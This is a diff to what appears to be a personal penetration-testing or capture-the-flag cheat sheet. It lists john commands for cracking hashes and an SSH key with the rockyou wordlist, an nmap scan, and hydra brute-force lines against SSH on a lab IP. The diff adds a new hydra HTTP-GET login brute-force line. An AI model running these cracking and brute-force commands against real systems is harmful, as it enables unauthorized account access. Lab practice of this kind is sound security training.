@@ -30,8 +30,11 @@ john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash4.txt
 /opt/john/ssh2john.py id_rsa > id_rsa.john
 john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john
 
-# password brute force 
+# password brute force - ssh
 hydra -l kay -P /usr/share/wordlists/rockyou.txt ssh://10.10.220.188
+
+# password brute force - http -- TODO: need more examples
+hydra -l ${HYDRA_USER} -P /usr/share/wordlists/rockyou.txt ${HOST} http-get "/protected:username=bob&password=^PASS^:InvalidPassword!"
 
 # port scanning 
 nmap -vv -A ${HOST}
